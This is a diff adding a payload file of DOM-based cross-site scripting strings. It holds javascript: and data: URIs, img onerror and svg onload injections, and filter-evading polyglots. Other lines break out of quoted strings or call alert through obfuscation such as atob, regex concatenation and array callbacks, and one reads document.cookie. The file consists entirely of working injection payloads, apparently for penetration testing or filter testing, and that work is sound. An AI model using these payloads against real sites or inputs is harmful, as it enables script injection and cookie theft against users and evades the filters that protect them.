@@ -1,0 +1,35 @@
+# XSS DOM-Based Payloads — Source/Sink exploitation
+#"onmouseover=alert(1)
+javascript:alert(1)
+javascript:alert(document.domain)
+javascript:alert(document.cookie)
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+#<img src=x onerror=alert(1)>
+#"><img src=x onerror=alert(1)>
+javascript:/*--></title></style></textarea></script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//
+\"-alert(1)-\"
+\'-alert(1)-\'
+'-alert(1)-'
+";alert(1);//
+';alert(1);//
+/alert(1)//
+alert(1)
+alert`1`
+alert.call(null,1)
+(alert)(1)
+alert?.()
+window['al'+'ert'](1)
+top[/al/.source+/ert/.source](1)
+self[atob('YWxlcnQ=')](1)
+Reflect.apply(alert,null,[1])
+[1].find(alert)
+[1].map(alert)
+[1].every(alert)
+[1].filter(alert)
+[1].findIndex(alert)
+[1].forEach(alert)
+Promise.reject(1).catch(alert)
+crypto.subtle.digest('SHA-256',new Uint8Array).then(alert)
+new Worker('data:,alert(1)')
